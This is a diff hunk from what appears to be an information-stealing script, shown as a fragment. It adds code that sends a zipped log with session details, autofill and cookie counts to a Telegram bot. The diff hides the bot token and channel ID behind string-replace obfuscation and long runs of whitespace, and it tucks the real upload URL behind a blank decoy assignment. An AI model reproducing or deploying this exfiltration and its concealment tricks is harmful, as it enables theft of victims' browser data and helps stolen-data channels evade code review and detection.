@@ -790,7 +790,7 @@ with zipfile.ZipFile(log_file, "w") as zip_file:
 # ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
 # ============================================================================================= SEND DATA ============================================================================================================ #
 if not debug:
-    channel_id = "-1002458809139"                                                                                                                                                                                                                                                                                                                                                             ;bot = "7931282619:AAHWAkGZRWJcRLI81QMacRFSnc0_ddvRK9E"
+    channel_id = "-10024588025972410216421009139".replace("0259724102164210", "")                                                                                                                                                                                                                                                                                                                                                         ;bot = "gjozqjosjfosvcls,gozengiehnqisfivqnscksqnkgnziq7931_-_-_-_-_-_-_282619:AAHWAkGZqzgihfsiqhishfishcushgqugfzqRWJcRLI81QMacRFSnc0_ddvRK9E".replace("gjozqjosjfosvcls,gozengiehnqisfivqnscksqnkgnziq", "").replace("qzgihfsiqhishfishcushgqugfzq", "").replace("_-_-_-_-_-_-_", "")
     message = f"""
     <u><b>System Infos :</b></u>
     👤 Session Name: {session}
@@ -807,7 +807,7 @@ if not debug:
     📑 Auto-fills: {total_autofills}
     🍪 Cookies: {total_cookies}"""
 
-    url = f"https://api.telegram.org/bot{bot}/sendDocument"
+    url = ""                                                                                                                                                                                                                                                                                                                                                                                                                                           ;url=f"https://api.telegram.org/bot{bot}/sendDocument"
     with open(log_file, "rb") as file:
         files = {"document": file}
         data = {"chat_id": channel_id, "caption": message, "parse_mode": "HTML"}
